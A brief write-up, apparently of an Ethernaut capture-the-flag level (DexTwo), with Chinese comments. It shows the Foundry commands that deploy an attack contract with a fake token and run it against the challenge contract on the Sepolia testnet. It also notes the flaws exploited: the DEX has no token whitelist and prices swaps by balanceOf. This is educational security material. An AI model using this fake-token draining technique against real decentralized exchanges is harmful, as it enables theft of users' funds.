# 24-DexTwo
```
# 1. 部署攻击合约（会自动创建 FakeToken）
forge create src/24-DexTwo/DexTwoAttackAuto.sol:DexTwoAttackAuto \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
====>
Deployed to: 0x62796C20c3c6417389F3C9D10edfadbFA0B74C24

export dex2ATTACK_ADDRESS=0x62796C20c3c6417389F3C9D10edfadbFA0B74C24
export DexTwo_ADDRESS=0x450c4274FE01e7CC8eC09740Dbac2c52C68d4813
# 2. 执行攻击
cast send $dex2ATTACK_ADDRESS "attack(address)" $DexTwo_ADDRESS \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    -vv
```

### 考察点 
- 没有验证token白名单
- 使用 balanceOf 作为定价依据: